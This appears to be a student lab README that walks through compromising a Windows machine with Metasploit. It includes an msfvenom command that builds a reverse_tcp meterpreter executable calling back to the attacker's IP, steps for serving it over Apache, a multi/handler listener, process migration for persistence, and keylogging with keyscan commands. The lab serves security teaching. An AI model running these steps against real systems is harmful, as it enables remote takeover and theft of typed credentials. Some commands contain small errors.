# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![e1](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/c7a74692-d0e4-4f97-bb10-e8104290e91e)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![e2](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/7723aa1c-03d7-4c13-b785-36fbdae26e91)



copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![e3](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/a9ba876a-8c51-4be1-9d34-d3dc92906310)



Start apache server
sudo systemctl apache2 start

## OUTPUT:
![e4](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/4c07a053-12b8-449d-b513-9c820d28158a)


Check the status of apache2

## OUTPUT:
![e5](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/e7bb8275-972f-4fbf-89ab-634940b86d91)



## Invoke msfconsole:

## OUTPUT:
![e6](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/d277952d-93e4-4242-b71a-da825ca40877)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![e7](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/2561cb91-c550-4fa7-ae0f-f43d31864c9c)



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

## OUTPUT:
![e8](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/797df7a5-f3e4-42cb-9b79-6e7d0c971653)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

## OUTPUT:
![e9](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/f37ef54c-5700-47bd-979e-0a5212fe6cc3)



Bypass any warning boxes, double-click the file, and allow it to run.

## OUTPUT:
![e10](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/c0a15803-60fb-46e7-a729-49d358fdf532)


On kali give the command exploit

## OUTPUT:
![e11](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/a32411d4-93f4-47a2-bad4-d31f58b20ab8)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:
![e12](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/c0ac12ba-c653-423d-a2ff-db62dac07f89)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
![e13](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/39cf986d-37ed-482c-b35d-ce2e162dbd77)


## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:
![e14](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/db28d5ea-d531-42d9-9d7d-3afe2b780e83)


![e15](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/c9da18de-67d3-425d-9a2d-bebae28936a8)


keyscan_dump	Shows the keystrokes captured so far

## OUTPUT:
![e16](https://github.com/Vishwarathinam/Compromising-windows-using-Metasploit/assets/95266350/61704804-5843-4088-a922-a4ed6f23f85b)























## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
